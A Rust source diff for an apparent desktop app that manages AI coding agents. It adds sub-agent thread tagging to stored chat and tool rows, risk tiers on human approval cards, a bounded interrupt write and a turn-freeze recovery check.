@@ -8,7 +8,7 @@
 
 use crate::store::{repo, Db};
 use dashmap::DashMap;
-use std::collections::{HashMap, VecDeque};
+use std::collections::{HashMap, HashSet, VecDeque};
 use std::sync::Arc;
 use tauri::{AppHandle, Emitter, Manager};
 use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
@@ -807,13 +807,46 @@ fn tool_row_status(has_output: bool, trackable: bool, is_error: bool) -> &'stati
     }
 }
 
+/// Build a `kind:"tool"` row's persisted content (issue #99): `agentThread`
+/// tags a sub-agent's OWN tool call (e.g. it calling `read_file`) with which
+/// sub-agent produced it, and — orthogonally — a `collabAgentToolCall` call's
+/// `collab_threads` tags the row with whichever sub-agent thread id(s) IT
+/// knows about, so the frontend can anchor that thread's branch here. Neither
+/// key is present at all when empty/None, so an ordinary tool call's content
+/// is byte-identical to pre-#99 output — same contract as `text_row_content`.
+/// Pure and DB-free by design: `persist_tool_calls` is the only caller in the
+/// live path, but keeping this separate lets it be unit-tested directly.
+fn tool_row_content(call: &super::proto::ToolCall, agent_thread: Option<&str>) -> serde_json::Value {
+    let mut content = serde_json::json!({
+        "name": call.name,
+        "summary": call.summary,
+        "input": call.input,
+        "output": call.output.clone().unwrap_or_default(),
+        "is_error": call.is_error,
+    });
+    if let Some(obj) = content.as_object_mut() {
+        if let Some(t) = agent_thread {
+            obj.insert("agentThread".into(), t.into());
+        }
+        if !call.collab_threads.is_empty() {
+            obj.insert("collabThreads".into(), call.collab_threads.clone().into());
+        }
+    }
+    content
+}
+
 /// Persist a turn's tool calls as `kind:"tool"` rows (running until their result
-/// arrives). Shared by spawn_reader (claude/exec) and codex_consumer (app-server).
+/// arrives). Shared by spawn_reader (claude/exec, always `agent_thread: None` —
+/// those dialects have no collab/sub-agent concept) and codex_consumer
+/// (app-server, issue #99). `merge_tool_results` mutates this row's stored
+/// content value in place (never rebuilds it), so both tags `tool_row_content`
+/// sets survive into the result.
 async fn persist_tool_calls(
     app: &AppHandle,
     db: &Db,
     inner: &mut EngineInner,
     tools: Vec<super::proto::ToolCall>,
+    agent_thread: Option<String>,
 ) {
     let thread_id = inner.thread_id;
     for call in tools {
@@ -821,15 +854,9 @@ async fn persist_tool_calls(
         let running = call.output.is_none();
         let trackable = running && !call.id.is_empty();
         let status = tool_row_status(!running, trackable, call.is_error);
-        let content = serde_json::json!({
-            "name": call.name,
-            "summary": call.summary,
-            "input": call.input,
-            "output": call.output.unwrap_or_default(),
-            "is_error": call.is_error,
-        });
+        let call_id = call.id.clone();
+        let content = tool_row_content(&call, agent_thread.as_deref());
         let content_str = content.to_string();
-        let call_id = call.id;
         match repo::insert_lead_message(
             db,
             thread_id,
@@ -876,6 +903,19 @@ async fn merge_tool_results(
         if let Some(obj) = content.as_object_mut() {
             obj.insert("output".into(), item.output.into());
             obj.insert("is_error".into(), item.is_error.into());
+            // issue #99: a `spawnAgent` collab call's `receiverThreadIds` is
+            // empty at item/started (captured — emptily — into this row's
+            // content by persist_tool_calls) and only becomes known HERE, at
+            // item/completed. Merge it in now so the frontend can still anchor
+            // that thread's branch to this row once it re-renders — until
+            // then, the child's own rows (already tagged with agentThread)
+            // have no known anchor yet and correctly render top-level/flat
+            // (collabBranches.ts's groupTimeline is a stateless whole-array
+            // recompute, so this is an honest "not resolved yet", not a wrong
+            // guess: nothing is hidden, it just hasn't grouped yet).
+            if !item.collab_threads.is_empty() {
+                obj.insert("collabThreads".into(), item.collab_threads.clone().into());
+            }
         }
         let status = if item.is_error { "error" } else { "complete" };
         let content_str = content.to_string();
@@ -1089,19 +1129,20 @@ async fn finalize_current_text(app: &AppHandle, db: &Db, inner: &mut EngineInner
     let Some((id, text, _)) = inner.current.take() else {
         return;
     };
-    finalize_text_row(app, db, inner, id, text, status, false).await;
+    // `current` (the anonymous slot) is never a sub-agent branch — see its doc.
+    finalize_text_row(app, db, inner, id, text, status, false, None).await;
 }
 
 /// Finalize every item-keyed open text row (app-server parallel streams) with
 /// `status`. Row order is already fixed by insertion; drain order is irrelevant.
 async fn finalize_open_texts(app: &AppHandle, db: &Db, inner: &mut EngineInner, status: &str) {
-    let rows: Vec<(i32, String)> = inner
+    let rows: Vec<(i32, String, Option<String>)> = inner
         .open_texts
         .drain()
-        .map(|(_, (id, text, _))| (id, text))
+        .map(|(_, r)| (r.row, r.buf, r.agent_thread))
         .collect();
-    for (id, text) in rows {
-        finalize_text_row(app, db, inner, id, text, status, false).await;
+    for (id, text, agent_thread) in rows {
+        finalize_text_row(app, db, inner, id, text, status, false, agent_thread.as_deref()).await;
     }
 }
 
@@ -1112,6 +1153,9 @@ async fn finalize_open_texts(app: &AppHandle, db: &Db, inner: &mut EngineInner, 
 /// (authoritative TextDone override / standalone rows inserted empty) — the
 /// finalize push must then carry the content even when sentinels changed nothing,
 /// or the live React state keeps the stale streamed chunks until a reload.
+/// `agent_thread` (issue #99) is re-embedded into the rewritten content here —
+/// this is the row's LAST content write for the turn, so a cold reload must see
+/// the same tag the live view showed, not lose it to this rebuild.
 async fn finalize_text_row(
     app: &AppHandle,
     db: &Db,
@@ -1120,6 +1164,7 @@ async fn finalize_text_row(
     text: String,
     status: &str,
     replaced: bool,
+    agent_thread: Option<&str>,
 ) {
     let thread_id = inner.thread_id;
     let origin_tag = inner.current_origin_tag.clone();
@@ -1142,13 +1187,8 @@ async fn finalize_text_row(
     } else {
         (text, false)
     };
-    let _ = repo::update_lead_message(
-        db,
-        id,
-        &serde_json::json!({ "text": clean }).to_string(),
-        status,
-    )
-    .await;
+    let _ = repo::update_lead_message(db, id, &text_row_content(&clean, agent_thread), status)
+        .await;
     let _ = app.emit(
         EVENT,
         Push::Finalize {
@@ -1191,10 +1231,12 @@ async fn cleanup_disconnected_turn(
     let current = inner.current.take().map(|(id, text, _)| (id, text));
     // Item-keyed open rows freeze like `current`: raw text + terminal status
     // (no sentinel pass — mirrors the anonymous slot's disconnect handling).
-    let orphan_texts: Vec<(i32, String)> = inner
+    // `agent_thread` (issue #99) rides along so this freeze doesn't drop the
+    // sub-agent tag a cold reload would otherwise disagree with the live view on.
+    let orphan_texts: Vec<(i32, String, Option<String>)> = inner
         .open_texts
         .drain()
-        .map(|(_, (id, text, _))| (id, text))
+        .map(|(_, r)| (r.row, r.buf, r.agent_thread))
         .collect();
     let turn_saw_text = inner.turn_saw_text;
     inner.turn_saw_text = false;
@@ -1237,14 +1279,10 @@ async fn cleanup_disconnected_turn(
     // insert below (same rule as the TurnEnd path), or the disconnect would
     // append a spurious terminal bubble after it.
     let had_orphan_texts = !orphan_texts.is_empty() || turn_saw_text;
-    for (id, text) in orphan_texts {
-        let _ = repo::update_lead_message(
-            db,
-            id,
-            &serde_json::json!({ "text": text }).to_string(),
-            status,
-        )
-        .await;
+    for (id, text, agent_thread) in orphan_texts {
+        let _ =
+            repo::update_lead_message(db, id, &text_row_content(&text, agent_thread.as_deref()), status)
+                .await;
         emit_finalize(app, thread_id, id, status);
     }
     if let Ok(Some(row)) = persist_disconnected_turn_row(
@@ -1385,6 +1423,47 @@ impl TurnClock {
     }
 }
 
+/// One app-server item-keyed streaming text row's live state (issue #99 adds
+/// `agent_thread` to the pre-existing (row id, buf, last-flush) tuple). Only
+/// `open_texts` uses this — the anonymous `current` slot (exec/claude/opencode,
+/// and app-server's own item-less events) never attributes to a sub-agent, so
+/// it keeps its plain tuple type unchanged.
+pub struct OpenTextRow {
+    pub row: i32,
+    pub buf: String,
+    pub last_flush: std::time::Instant,
+    /// The sub-agent thread this row belongs to, already normalized against the
+    /// session's own thread id (`branch_of`) — None = mainline. Re-embedded into
+    /// the row's persisted content on EVERY rewrite (streaming throttle tick,
+    /// finalize, disconnect cleanup, hard stop) so a cold reload groups it
+    /// identically to the live view — see `text_row_content`.
+    pub agent_thread: Option<String>,
+}
+
+/// Normalizes a raw wire `agent_thread` (whatever `threadId` the event arrived
+/// on — see `codex_app_server::notification_to_event`) against this session's
+/// OWN thread id into a grouping-ready value: `None` for the session's own
+/// mainline activity (including every non-app-server dialect, which never sets
+/// a raw thread at all), `Some(id)` for a genuine sub-agent's row. This is the
+/// ONE place "is this row foreign" is decided (issue #99) — everything
+/// downstream (row content, tool rows) just carries whatever this returns.
+fn branch_of(raw: Option<String>, own_thread: &str) -> Option<String> {
+    raw.filter(|t| t != own_thread)
+}
+
+/// Build a `kind:"text"` row's persisted content, `agentThread` included only
+/// when this row belongs to a sub-agent (issue #99) — an untagged row is
+/// byte-identical to pre-#99 output. Centralizing this is what lets the tag
+/// survive every rewrite of a row's content (throttled streaming update,
+/// finalize, disconnect cleanup, hard stop all funnel through it) instead of
+/// only its first insert, which would desync the live view from a cold reload.
+fn text_row_content(text: &str, agent_thread: Option<&str>) -> String {
+    match agent_thread {
+        Some(t) => serde_json::json!({ "text": text, "agentThread": t }).to_string(),
+        None => serde_json::json!({ "text": text }).to_string(),
+    }
+}
+
 pub struct EngineInner {
     pub thread_id: i32,
     /// claude | codex | opencode — selects the wire dialect + process model.
@@ -1431,10 +1510,12 @@ pub struct EngineInner {
     /// Streaming assistant row being built: (row id, accumulated text, last DB flush).
     /// exec/claude 的单串行匿名槽;app-server 的 item 键控行走 `open_texts`。
     pub current: Option<(i32, String, std::time::Instant)>,
-    /// app-server 并行流式 item → 其开放文本行 (row id, 累积文本, last DB flush)。
-    /// 镜像 `tool_rows` 的按 item 分键模式:主叙述与各 collab 子 agent 的
-    /// agentMessage 各自成行,工具行不再切断文本,item/completed 以权威全文定稿。
-    pub open_texts: std::collections::HashMap<String, (i32, String, std::time::Instant)>,
+    /// app-server 并行流式 item → 其开放文本行。镜像 `tool_rows` 的按 item 分键
+    /// 模式:主叙述与各 collab 子 agent 的 agentMessage 各自成行,工具行不再切断
+    /// 文本,item/completed 以权威全文定稿。`agent_thread`(issue #99)与行同寿命,
+    /// 每次内容重建(节流更新/finalize/disconnect/hard stop)都要带上它,否则冷
+    /// 加载会读到丢了标记的最终内容——见 `OpenTextRow` 文档。
+    pub open_texts: std::collections::HashMap<String, OpenTextRow>,
     /// 本轮已落过「即插即定稿」的独立文本行(standalone TextDone:/plan 内容、
     /// 未流式的 agentMessage)。这类行不经过 current/open_texts,turn 失败时
     /// 终态插入要靠它抑制,否则真实输出之后还会追加 *_before_output 气泡。
@@ -3097,13 +3178,14 @@ async fn spawn_acp_turn(
         }
         g.reset_epoch
     };
-    let (a, d, e, c, s, txt) = (
+    let (a, d, e, c, s, txt, imgs) = (
         app.clone(),
         db.clone(),
         eng.clone(),
         client.clone(),
         session_id.clone(),
         text,
+        out.images.clone(),
     );
     tauri::async_runtime::spawn(async move {
         // Re-validate under the lock once more right before the RPC — stop may
@@ -3132,7 +3214,7 @@ async fn spawn_acp_turn(
                 },
             );
         }
-        match c.prompt(&s, &txt).await {
+        match c.prompt(&s, &txt, &imgs).await {
             Ok(outcome) => {
                 let (cancelled, stopped) = {
                     let g = e.lock().await;
@@ -3243,7 +3325,7 @@ async fn acp_emit_turn_end(
             let thread_id = eng.lock().await.thread_id;
             let session_id = eng.lock().await.session_id;
             mark_queued_delivered(&app, &db, thread_id, session_id, &msg).await;
-            match client.prompt(&sid, &msg.text).await {
+            match client.prompt(&sid, &msg.text, &msg.images).await {
                 Ok(outcome) => {
                     pending_usage = outcome.usage.clone();
                     pending_error = outcome.is_error;
@@ -3454,7 +3536,7 @@ async fn acp_consumer(
                 );
             }
 
-            SessionEvent::Chat(ChatEvent::TextDelta { text, item: _ }) => {
+            SessionEvent::Chat(ChatEvent::TextDelta { text, item: _, agent_thread: _ }) => {
                 // Answer tokens started — drop soft/real thinking chip always.
                 thought_buf.clear();
                 {
@@ -3537,7 +3619,7 @@ async fn acp_consumer(
                 if inner.current.is_some() {
                     finalize_current_text(&app, &db, &mut inner, "complete").await;
                 }
-                persist_tool_calls(&app, &db, &mut inner, tools).await;
+                persist_tool_calls(&app, &db, &mut inner, tools, None).await;
             }
             SessionEvent::Chat(ChatEvent::ToolResults { items }) => {
                 let mut inner = eng.lock().await;
@@ -3640,12 +3722,36 @@ async fn acp_consumer(
                         Some(crate::ask::Decision::Allow) => crate::acp::Want::AllowOnce,
                         Some(crate::ask::Decision::Deny) => crate::acp::Want::RejectOnce,
                         None => {
+                            // Risk tier for the Needs-you card (issue #101). ACP
+                            // intent_key is coarse (bash/read/edit/…); classify from
+                            // that + detail so the card matches other engines.
+                            let risk = crate::ask::classify_risk(
+                                if intent_key == "bash" || intent_key == "execute" {
+                                    crate::ask::RiskSignal::Command(&detail)
+                                } else if intent_key == "read" || intent_key == "search" {
+                                    crate::ask::RiskSignal::File {
+                                        tool_name: "Read",
+                                        path: &detail,
+                                    }
+                                } else if intent_key == "edit" || intent_key == "write" || intent_key == "delete" {
+                                    crate::ask::RiskSignal::File {
+                                        tool_name: "Edit",
+                                        path: &detail,
+                                    }
+                                } else {
+                                    crate::ask::RiskSignal::Other {
+                                        tool_name: &intent_key,
+                                        args_text: &detail,
+                                    }
+                                },
+                            );
                             let (id, rx) = asks.request(
                                 thread_id,
                                 &dir,
                                 &tool,
                                 &summary,
                                 &detail,
+                                risk,
                                 &action_key,
                             );
                             // Track so stop() can cancel the Needs-you card.
@@ -3707,19 +3813,27 @@ async fn codex_consumer(
         Arc::new(crossbeam_skiplist::SkipMap::new());
     while let Some(msg) = rx.recv().await {
         match msg {
-            ThreadMsg::Event(ChatEvent::TextDelta { text, item }) => {
+            ThreadMsg::Event(ChatEvent::TextDelta { text, item, agent_thread }) => {
                 let mut inner = eng.lock().await;
                 note_turn_activity(&app, &db, &eng, &mut inner);
                 let thread_id = inner.thread_id;
                 let (sid, turn) = (inner.session_id, inner.turn_id);
                 // Ensure the target row exists: item-keyed rows in `open_texts`
                 // (parallel app-server streams), the anonymous slot in `current`
-                // (errors / turn-failure texts / non-item dialect paths).
+                // (errors / turn-failure texts / non-item dialect paths). A NEW
+                // item-keyed row's origin (issue #99) is normalized ONCE here —
+                // sticky for the row's whole life (OpenTextRow::agent_thread),
+                // never re-derived from a later delta on the same item.
                 let missing = match &item {
                     Some(k) => !inner.open_texts.contains_key(k),
                     None => inner.current.is_none(),
                 };
                 if missing {
+                    let branch = branch_of(agent_thread, &thread);
+                    let content = match &item {
+                        Some(_) => text_row_content("", branch.as_deref()),
+                        None => r#"{"text":""}"#.to_string(),
+                    };
                     let Ok(m) = repo::insert_lead_message(
                         &db,
                         thread_id,
@@ -3727,19 +3841,28 @@ async fn codex_consumer(
                         turn,
                         "assistant",
                         "text",
-                        r#"{"text":""}"#,
+                        &content,
                         "streaming",
                     )
                     .await
                     else {
                         continue;
                     };
-                    let fresh = (m.id, String::new(), std::time::Instant::now());
                     match &item {
                         Some(k) => {
-                            inner.open_texts.insert(k.clone(), fresh);
+                            inner.open_texts.insert(
+                                k.clone(),
+                                OpenTextRow {
+                                    row: m.id,
+                                    buf: String::new(),
+                                    last_flush: std::time::Instant::now(),
+                                    agent_thread: branch,
+                                },
+                            );
                         }
-                        None => inner.current = Some(fresh),
+                        None => {
+                            inner.current = Some((m.id, String::new(), std::time::Instant::now()))
+                        }
                     }
                     let _ = app.emit(
                         EVENT,
@@ -3751,19 +3874,38 @@ async fn codex_consumer(
                 }
                 // Read the in-flight turn's tag before borrowing the slot mutably.
                 let origin_tag = inner.current_origin_tag.clone();
-                let slot = match &item {
-                    Some(k) => inner.open_texts.get_mut(k),
-                    None => inner.current.as_mut(),
+                let row = match &item {
+                    Some(k) => {
+                        let Some(c) = inner.open_texts.get_mut(k) else {
+                            continue;
+                        };
+                        c.buf.push_str(&text);
+                        let row = c.row;
+                        if c.last_flush.elapsed().as_millis() >= STREAM_THROTTLE_MS {
+                            c.last_flush = std::time::Instant::now();
+                            let content = text_row_content(&c.buf, c.agent_thread.as_deref());
+                            let _ =
+                                repo::update_lead_message(&db, row, &content, "streaming").await;
+                            emit_lead_delta(&app, thread_id, row, &c.buf, false, origin_tag);
+                        }
+                        row
+                    }
+                    None => {
+                        let Some(c) = inner.current.as_mut() else {
+                            continue;
+                        };
+                        c.1.push_str(&text);
+                        let row = c.0;
+                        if c.2.elapsed().as_millis() >= STREAM_THROTTLE_MS {
+                            c.2 = std::time::Instant::now();
+                            let content = serde_json::json!({ "text": c.1 }).to_string();
+                            let _ =
+                                repo::update_lead_message(&db, row, &content, "streaming").await;
+                            emit_lead_delta(&app, thread_id, row, &c.1, false, origin_tag);
+                        }
+                        row
+                    }
                 };
-                let Some(c) = slot else { continue };
-                c.1.push_str(&text);
-                let row = c.0;
-                if c.2.elapsed().as_millis() >= STREAM_THROTTLE_MS {
-                    c.2 = std::time::Instant::now();
-                    let content = serde_json::json!({ "text": c.1 }).to_string();
-                    let _ = repo::update_lead_message(&db, row, &content, "streaming").await;
-                    emit_lead_delta(&app, thread_id, row, &c.1, false, origin_tag);
-                }
                 let _ = app.emit(
                     EVENT,
                     Push::Delta {
@@ -3773,7 +3915,7 @@ async fn codex_consumer(
                     },
                 );
             }
-            ThreadMsg::Event(ChatEvent::TextDone { item, text }) => {
+            ThreadMsg::Event(ChatEvent::TextDone { item, text, agent_thread }) => {
                 let mut inner = eng.lock().await;
                 note_turn_activity(&app, &db, &eng, &mut inner);
                 let streamed = item.as_ref().and_then(|k| inner.open_texts.remove(k));
@@ -3782,12 +3924,18 @@ async fn codex_consumer(
                     // authoritative full body over the accumulated frames. When
                     // that body differs (dropped/duped delta frames), the
                     // finalize push must carry it so the live view heals too.
-                    Some((row, buf, _)) => {
+                    // The row's origin was already decided at its FIRST delta
+                    // (OpenTextRow::agent_thread) — this event's OWN agent_thread
+                    // is redundant with it (same item, same thread) and unused.
+                    Some(OpenTextRow { row, buf, agent_thread: tag, .. }) => {
                         let auth = text.filter(|t| !t.is_empty());
                         let replaced = auth.as_deref().is_some_and(|t| t != buf);
                         let body = auth.unwrap_or(buf);
-                        finalize_text_row(&app, &db, &mut inner, row, body, "complete", replaced)
-                            .await;
+                        finalize_text_row(
+                            &app, &db, &mut inner, row, body, "complete", replaced,
+                            tag.as_deref(),
+                        )
+                        .await;
                     }
                     // No open row (content items never stream): land the text as
                     // a standalone completed row.
@@ -3797,6 +3945,8 @@ async fn codex_consumer(
                         };
                         let thread_id = inner.thread_id;
                         let (sid, turn) = (inner.session_id, inner.turn_id);
+                        let branch = branch_of(agent_thread, &thread);
+                        let content = text_row_content("", branch.as_deref());
                         let Ok(m) = repo::insert_lead_message(
                             &db,
                             thread_id,
@@ -3804,7 +3954,7 @@ async fn codex_consumer(
                             turn,
                             "assistant",
                             "text",
-                            r#"{"text":""}"#,
+                            &content,
                             "streaming",
                         )
                         .await
@@ -3821,11 +3971,15 @@ async fn codex_consumer(
                         // Inserted empty + finalized at once: the push must carry
                         // the body or the live view shows an empty bubble.
                         // (finalize_text_row records turn_saw_text.)
-                        finalize_text_row(&app, &db, &mut inner, m.id, t, "complete", true).await;
+                        finalize_text_row(
+                            &app, &db, &mut inner, m.id, t, "complete", true,
+                            branch.as_deref(),
+                        )
+                        .await;
                     }
                 }
             }
-            ThreadMsg::Event(ChatEvent::Assistant { texts, tools, .. }) => {
+            ThreadMsg::Event(ChatEvent::Assistant { texts, tools, agent_thread, .. }) => {
                 // Codex streams text via deltas; non-text items are tool calls →
                 // inline `kind:"tool"` rows, filled by their item.completed result.
                 // Text rows are NOT finalized here: each agentMessage closes via
@@ -3838,7 +3992,12 @@ async fn codex_consumer(
                 if !texts.is_empty() {
                     finalize_current_text(&app, &db, &mut inner, "complete").await;
                 }
-                persist_tool_calls(&app, &db, &mut inner, tools).await;
+                // Every tool this event carries is stamped with the SAME origin
+                // (issue #99) — app-server only ever sends one per event, so this
+                // is unambiguous; a sub-agent's own `read_file` call lands under
+                // its branch instead of looking like unattributed mainline noise.
+                let branch = branch_of(agent_thread, &thread);
+                persist_tool_calls(&app, &db, &mut inner, tools, branch).await;
             }
             ThreadMsg::Event(ChatEvent::ToolResults { items }) => {
                 let mut inner = eng.lock().await;
@@ -4123,11 +4282,15 @@ async fn codex_consumer(
                 // `summary` is a compact DISPLAY label (may truncate — a >3-path
                 // edit, a 120-char permission scope); `detail` is the FULL raw
                 // content (untruncated, shown in the detail tooltip / IM
-                // plain-text card); `action_key` is the EXACT action identity
-                // used ONLY for Always-grant matching (never displayed) — see
-                // #89. Mirrors `bus::server::summarize`'s claude/opencode shape
-                // so both engines share the same canonical action-key semantics.
-                let (tool, summary, detail, action_key) = codex_approval_fields(&method, &params);
+                // plain-text card); `risk` is the danger tier for the human's
+                // one-glance triage, computed by the single shared
+                // `crate::ask::classify_risk` (issue #101); `action_key` is the
+                // EXACT action identity used ONLY for Always-grant matching
+                // (never displayed) — see #89. Mirrors `bus::server::summarize`'s
+                // claude/opencode shape so both engines share the same canonical
+                // action-key (and risk) semantics.
+                let (tool, summary, detail, risk, action_key) =
+                    codex_approval_fields(&method, &params);
                 let registry = app.state::<crate::ask::AskRegistry>().inner().clone();
                 match registry.auto_decision(thread_id, &dir, &action_key) {
                     // dangerous mode / full access / always-allow: reply inline (fast).
@@ -4152,6 +4315,7 @@ async fn codex_consumer(
                             tool,
                             &summary,
                             &detail,
+                            risk,
                             &action_key,
                         );
                         // Remember this card by server-request id so a later
@@ -4196,18 +4360,23 @@ async fn codex_consumer(
 }
 
 
-/// The (tool, summary, detail, action_key) quadruple for a codex app-server
-/// approval — computed ONCE so the Needs-you card, the IM card, and Always
-/// matching all agree. `summary` is a compact DISPLAY label that may truncate
-/// (a >3-path edit, a 120-char permission scope); `detail` is the FULL raw
-/// content (untruncated); `action_key` is the EXACT action identity used ONLY
-/// for Always-grant matching (never displayed). Mirrors `bus::server::summarize`'s
-/// claude/opencode shape so both engines share the same canonical semantics —
-/// see issue #89.
-fn codex_approval_fields(
+/// The (tool, summary, detail, risk, action_key) quintuple for a codex
+/// app-server approval — computed ONCE so the Needs-you card, the IM card,
+/// and Always matching all agree. `summary` is a compact DISPLAY label that
+/// may truncate (a >3-path edit, a 120-char permission scope); `detail` is
+/// the FULL raw content (untruncated); `risk` is the danger tier for the
+/// human's one-glance triage, computed by the single shared
+/// `crate::ask::classify_risk` (issue #101); `action_key` is the EXACT action
+/// identity used ONLY for Always-grant matching (never displayed). Mirrors
+/// `bus::server::summarize`'s claude/opencode shape so both engines share the
+/// same canonical semantics — see issue #89.
+// `pub(crate)` (not `pub`) — crate-internal only, but visible to this
+// module's own test suite for the cross-engine consistency regression test
+// (issue #101 round-2 P3), which also calls `bus::server::summarize`.
+pub(crate) fn codex_approval_fields(
     method: &str,
     params: &serde_json::Value,
-) -> (&'static str, String, String, String) {
+) -> (&'static str, String, String, crate::ask::RiskLevel, String) {
     // command/cwd may sit at the top level (commandExecution ask) or nested
     // under `item` (the generic permissions ask) — read both.
     let cmd = params["command"]
@@ -4233,10 +4402,12 @@ fn codex_approval_fields(
             .or_else(|| net["domain"].as_str())
             .unwrap_or("network");
         let action_key = crate::ask::action_key(&["Network", host]);
+        let risk = crate::ask::classify_risk(crate::ask::RiskSignal::Network);
         return (
             "Network",
             format!("network access: {host}"),
             host.to_string(),
+            risk,
             action_key,
         );
     }
@@ -4252,19 +4423,31 @@ fn codex_approval_fields(
         // engine's action_key removes any need to re-litigate that argument
         // per call site (see #89's round-2 finding on the claude/opencode side).
         let action_key = crate::ask::action_key(&["Bash", &full]);
-        return ("Bash", format!("Run: {first}"), full.clone(), action_key);
+        let risk = crate::ask::classify_risk(crate::ask::RiskSignal::Command(&full));
+        return ("Bash", format!("Run: {first}"), full.clone(), risk, action_key);
     }
     if has_changes {
         // `full_paths` is the UNTRUNCATED changed-path list: the AskRegistry
         // keys Always rules by action_key, so a >3-path edit whose display
         // summary caps at "first 3 + N" must still disambiguate from a
-        // DIFFERENT >3-path edit sharing that same capped label.
+        // DIFFERENT >3-path edit sharing that same capped label. Routed
+        // through the SAME File classifier as bus::server::summarize's
+        // file_path branch — "Edit" is a recognized write verb, and a
+        // credential-shaped path among the changes (e.g. `.env`) still wins.
         let (summary, full_paths) = codex_change_approval_summary(params);
         let action_key = crate::ask::action_key(&["Edit", &full_paths]);
-        return ("Edit", summary, full_paths, action_key);
+        let risk = crate::ask::classify_risk(crate::ask::RiskSignal::File {
+            tool_name: "Edit",
+            path: &full_paths,
+        });
+        return ("Edit", summary, full_paths, risk, action_key);
     }
     // A permission escalation — key it by the REQUESTED scope, else an Always
-    // for one profile silently grants a later, different one.
+    // for one profile silently grants a later, different one. `risk` scans
+    // the scope text like any other MCP/fallback call; a scope that doesn't
+    // spell out "network"/a credential marker honestly lands on Unknown
+    // rather than guessing — a permission ESCALATION is inherently the kind
+    // of ask that deserves a closer look, not a reassuring green badge.
     let requested = params
         .get("permissions")
         .or_else(|| params["item"].get("permissions"))
@@ -4275,10 +4458,15 @@ fn codex_approval_fields(
         .unwrap_or_else(|| "(unspecified)".to_string());
     let scope_label: String = scope_json.chars().take(120).collect();
     let action_key = crate::ask::action_key(&["Permission", &scope_json]);
+    let risk = crate::ask::classify_risk(crate::ask::RiskSignal::Other {
+        tool_name: "Permission",
+        args_text: &scope_json,
+    });
     (
         "Permission",
         format!("permission: {scope_label}"),
         scope_json,
+        risk,
         action_key,
     )
 }
@@ -4462,6 +4650,14 @@ pub async fn queue_reorder(app: &AppHandle, _db: &Db, eng: &EngineRef, order: Ve
     Ok(())
 }
 
+/// Bound on the interrupt control-payload's stdin write (claude resident only,
+/// issue #93). A wedged pipe must not hang the interrupt path itself — the
+/// whole point of a turn-freeze watchdog is a bounded, reliable way OUT of a
+/// frozen turn. Short: this is a handful of bytes to an OS pipe: a healthy
+/// child drains it instantly, so this only trips when the pipe itself is dead —
+/// and the 3s kill-fallback below still fires on schedule either way.
+const INTERRUPT_WRITE_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(5);
+
 /// Interrupt the current turn: protocol control_request first (verified live:
 /// control_response + result{terminal_reason:aborted_streaming}); kill after 3s
 /// as the hard fallback. Either way `--resume` recovers the session next send.
@@ -4525,8 +4721,15 @@ pub async fn interrupt(app: &AppHandle, eng: &EngineRef) -> anyhow::Result<()> {
         .map(|a| a.interrupt_payload(inner.generation))
         .unwrap_or_default();
     if let Some(stdin) = inner.stdin.as_mut() {
-        let _ = stdin.write_all(payload.as_bytes()).await;
-        let _ = stdin.flush().await;
+        // Bounded (issue #93): a dead pipe must not block the interrupt path —
+        // the 3s kill-fallback spawned below still runs even when this never
+        // lands (a timed-out write is indistinguishable from a lost one; both
+        // fall through to it).
+        let _ = tokio::time::timeout(INTERRUPT_WRITE_TIMEOUT, async {
+            stdin.write_all(payload.as_bytes()).await?;
+            stdin.flush().await
+        })
+        .await;
     }
     let gen = inner.generation;
     drop(inner);
@@ -4774,6 +4977,63 @@ pub(crate) fn stall_verdict(
     stall_secs > 0 && busy && !has_open_ask && quiet_secs >= stall_secs
 }
 
+/// Production default for the turn-freeze auto-recovery threshold (issue #93):
+/// 10 min (600s). After the stall-visibility hint (8 min, above) so the user
+/// always SEES the visual warning before anything acts on it, and well before
+/// the runaway idle-kill cap (default 30 min — a human-tunable §7 cost/expense
+/// guard, not a "is the transport dead" detector). Dogfooding hit an agent
+/// frozen mid-tool-call for 15+ minutes with no recourse but a full app restart
+/// (#93) — this closes that gap with an automatic action instead of requiring a
+/// human to notice and intervene. Override with `WEFT_TURN_FREEZE_SECS` (0
+/// disables). Named + sentinel-tested so it can't be silently shortened.
+const TURN_FREEZE_DEFAULT_SECS: u64 = 600;
+
+/// Action verdict for the turn-freeze auto-recovery (issue #93): the same
+/// silence shape as `stall_verdict` (busy, not legitimately blocked on a human,
+/// quiet past a threshold) but answers a different question — not "should the
+/// user be shown a hint" but "should we cut this turn loose now". Kept as its
+/// own named predicate (not a reuse of `stall_verdict`) because the two answer
+/// independent questions on independent thresholds, and `stall_verdict`'s own
+/// contract is purely visual ("No side effects, no kill" — see its doc).
+///
+/// `has_open_tool_call` (review round 1, P0): claude / codex-exec / opencode
+/// share `spawn_reader`, whose `ChatEvent` vocabulary has NO "tool still
+/// running" event — a `Bash`-type tool goes `tool_use` (refreshes the clock) →
+/// **zero stdout for the tool's ENTIRE execution** → `tool_result` (refreshes
+/// the clock). A legitimate `cargo build` / `pnpm install` / large `git clone`
+/// silently exceeds `freeze_secs` routinely and would otherwise be
+/// misjudged frozen and destructively interrupted mid-flight — not a false
+/// ALARM, a false KILL: `recover_from_freeze` clears native context, which is
+/// not undoable. `has_open_tool_call` must be true whenever a tool_use has
+/// been seen without its matching tool_result — see the caller's
+/// `!inner.tool_rows.is_empty()`. Structural guarantee for claude/codex-exec
+/// (their adapters always set `tool_rows` for a running call). codex
+/// app-server ALSO populates `tool_rows` for tool calls that ride the shared
+/// `ChatEvent::Assistant{tools}` pipeline (e.g. `collabAgentToolCall` — see
+/// `codex_consumer`'s `persist_tool_calls` call), on top of its own dedicated
+/// `outputDelta` heartbeat for direct command-execution streaming (see
+/// `ThreadMsg::Heartbeat`) — belt and suspenders, not load-bearing either way.
+/// opencode's adapter is the one real gap: it CANNOT populate `tool_rows` for a
+/// running call (its wire has no stable per-call id to correlate running→
+/// completed frames — see `parse_opencode`'s comment), so it falls back to its
+/// own re-emitted progress lines refreshing `last_activity` directly (already
+/// happens for free: every raw stdout line updates the clock before parsing —
+/// see `spawn_reader`) — weaker, not structurally proven, a documented
+/// residual gap (PR body, issue #93). Pure → unit-tested.
+pub(crate) fn freeze_verdict(
+    busy: bool,
+    quiet_secs: u64,
+    freeze_secs: u64,
+    has_open_ask: bool,
+    has_open_tool_call: bool,
+) -> bool {
+    freeze_secs > 0
+        && busy
+        && !has_open_ask
+        && !has_open_tool_call
+        && quiet_secs >= freeze_secs
+}
+
 /// Does open permission ask `(k_dir, k_thread)` block engine `ask_dir`@`thread_id`
